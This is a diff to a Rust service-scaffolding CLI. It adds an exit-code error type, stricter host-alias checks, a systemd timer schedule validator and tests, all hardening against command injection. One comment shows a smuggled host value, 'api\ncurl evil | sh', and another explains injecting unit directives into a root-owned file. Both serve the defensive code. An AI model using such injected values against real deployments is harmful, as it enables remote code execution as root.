@@ -67,15 +67,64 @@ struct Scaffold {
     next_steps: Vec<String>,
 }
 
+/// A `service` subcommand failure, classified for the CLI exit code.
+///
+/// Design §6 draws the same distinction for the `run` path: 1 means "the
+/// request is wrong", 3 means "the request could not even be attempted"
+/// (a missing tool, an unreachable host). The `service` subcommands classify
+/// the same way, so a missing `ssh` is reported as the transport/setup
+/// failure it is instead of as a generic error — the two paths must not
+/// disagree about the same failure class.
+#[derive(Debug)]
+pub(crate) enum ServiceError {
+    /// The transport was unavailable (missing `ssh`, unreachable host).
+    Transport(eyre::Report),
+    /// Any other failure.
+    Other(eyre::Report),
+}
+
+impl ServiceError {
+    /// The CLI exit code for this failure (design §6).
+    #[must_use]
+    pub(crate) const fn exit_code(&self) -> i32 {
+        match self {
+            Self::Transport(_) => 3,
+            Self::Other(_) => 1,
+        }
+    }
+}
+
+impl std::fmt::Display for ServiceError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::Transport(report) | Self::Other(report) => write!(f, "{report:#}"),
+        }
+    }
+}
+
+impl std::error::Error for ServiceError {
+    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
+        match self {
+            Self::Transport(report) | Self::Other(report) => report.source(),
+        }
+    }
+}
+
+impl From<eyre::Report> for ServiceError {
+    fn from(report: eyre::Report) -> Self {
+        Self::Other(report)
+    }
+}
+
 /// Scaffold a service.
 ///
 /// # Errors
 ///
-/// Returns when the service name is unusable, when any target path already
-/// exists (never overwrites), or on I/O failures.
-pub(crate) fn run(cmd: &ServiceCmd) -> Result<()> {
+/// Returns [`ServiceError::Transport`] when the transport is unavailable and
+/// [`ServiceError::Other`] for every other failure.
+pub(crate) fn run(cmd: &ServiceCmd) -> Result<(), ServiceError> {
     match cmd {
-        ServiceCmd::Init(args) => init(args),
+        ServiceCmd::Init(args) => init(args).map_err(ServiceError::Other),
         ServiceCmd::Check(args) => crate::service_check::check(args),
     }
 }
@@ -100,6 +149,9 @@ fn init(cmd: &ServiceInitArgs) -> Result<()> {
     }
     if cmd.pattern == ServicePattern::Oneshot && cmd.timer.is_none() {
         // A timer is optional; without one the unit is a run-once task.
+    }
+    if let Some(schedule) = &cmd.timer {
+        validate_schedule(schedule)?;
     }
 
     let dir = PathBuf::from(format!("services/{service}"));
@@ -216,8 +268,7 @@ fn build_scaffold(
                         .replace("__SCHEDULE__", schedule),
                     false,
                 )
-            });
-            let timer_install = timer.map_or(
+            });            let timer_install = timer.map_or(
                 "# No timer requested (pass --timer to add one).",
                 |_| "sudo install -m 0644 \"${WORKDIR}/svc/${SVC}.timer\" \"/etc/systemd/system/${SVC}.timer\"",
             );
@@ -284,10 +335,34 @@ fn validate_service_name(service: &str) -> Result<()> {
 /// `api\ncurl evil | sh` injects commands into the generated playbook's
 /// **executable body**, not just into its comment lines.
 fn validate_host_alias(host: &str) -> Result<()> {
+    // `.` and `..` are rejected: the alias becomes a path-like token in the
+    // generated playbook and a target directory component, and a leading `-`
+    // would be read as an option by `ssh`.
     let valid = !host.is_empty() &&
+        !matches!(host, "." | "..") &&
+        !host.starts_with('-') &&
         host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
     if !valid {
-        bail!("invalid host alias `{host}` (want [A-Za-z0-9._-]+, no whitespace)");
+        bail!("invalid host alias `{host}` (want [A-Za-z0-9._-]+, no whitespace, not `.`/`..`)");
+    }
+    Ok(())
+}
+
+/// Validate a systemd `OnCalendar` schedule.
+///
+/// The schedule is interpolated verbatim into the generated `.timer` unit,
+/// and that unit is installed into `/etc/systemd/system/` as root by the
+/// generated playbook. A newline would therefore inject arbitrary unit
+/// directives (`ExecStartPre=…`) into a root-owned unit file.
+fn validate_schedule(schedule: &str) -> Result<()> {
+    let valid = !schedule.is_empty() &&
+        !schedule.contains(['\n', '\r']) &&
+        schedule.chars().all(|c| c.is_ascii_alphanumeric() || " \t-_*.,:/()".contains(c));
+    if !valid {
+        bail!(
+            "invalid --timer schedule `{schedule}` (want a systemd OnCalendar expression \
+             without newlines)"
+        );
     }
     Ok(())
 }
@@ -315,8 +390,18 @@ fn write_executable(path: &Path, content: &str) -> Result<()> {
 
 #[cfg(test)]
 mod tests {
-    use super::{build_scaffold, validate_service_name};
+    use super::{ServiceError, build_scaffold, validate_service_name};
     use crate::cli::ServicePattern;
+
+    #[test]
+    fn a_transport_failure_exits_three_and_anything_else_exits_one() {
+        // Design §6: a missing tool or an unreachable host is a
+        // transport/setup failure (3), not a generic error (1).
+        let transport = ServiceError::Transport(eyre::eyre!("missing ssh"));
+        assert_eq!(transport.exit_code(), 3);
+        let other = ServiceError::Other(eyre::eyre!("bad service name"));
+        assert_eq!(other.exit_code(), 1);
+    }
 
     fn files(pattern: ServicePattern) -> Vec<String> {
         build_scaffold(pattern, "myapp", &["api".to_string()], None)
@@ -346,8 +431,8 @@ mod tests {
             .1;
         assert!(body.contains("/usr/local/bin/shellflow cred-env credstore-install"));
         assert!(
-            !body.contains("sudo -E /usr/local/bin/shellflow")
-                && !body.contains("sudo /usr/local/bin/shellflow cred-env credstore-install"),
+            !body.contains("sudo -E /usr/local/bin/shellflow") &&
+                !body.contains("sudo /usr/local/bin/shellflow cred-env credstore-install"),
             "self-elevation: playbook calls credstore-install without sudo"
         );
         assert!(body.contains("SVC=\"${SVC:-myapp}\""));
